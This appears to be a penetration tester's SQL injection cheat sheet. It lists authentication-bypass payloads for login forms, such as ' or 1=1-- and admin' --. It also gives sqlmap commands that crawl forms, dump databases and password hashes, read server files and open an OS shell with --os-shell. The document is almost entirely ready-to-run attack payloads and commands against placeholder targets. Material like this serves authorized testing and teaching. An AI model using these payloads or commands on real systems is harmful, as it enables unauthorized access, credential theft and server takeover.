# 🪡 SQL Injection Cheat Sheet

#### Common **Injections for Login Forms:**

* `admin' --`
* `admin' #`
* `admin'/*`
* `' or 1=1--`
* `' or 1=1#`
* `' or 1=1/*`
* `') or '1'='1--`
* `') or ('1'='1—`

#### **SQLMap** <a href="#toc475369027" id="toc475369027"></a>

* `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
  * Automated sqlmap scan
* `sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3`
* `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"`
  * Targeted sqlmap scan
* `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump` Scan url for union + error based injection with mysql backend and use a random user agent + database dump
* `sqlmap -o -u "http://meh.com/form/" –forms`
  * sqlmap check form for injection
* `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users –dump`
  * sqlmap dump and crack hashes for table users on database-name.
* `sqlmap --flush session`
  * Flushes the session
* `sqlmap -p user --technique=B`
  * Attempts to exploit the “user” field using boolean technique.
* `sqlmap -r <captured request>`
  * Capture a request via Burp Suite, save it to a file, and use this command to let sqlmap automate everything. Add –os-shell at the end to pop a shell if possible.
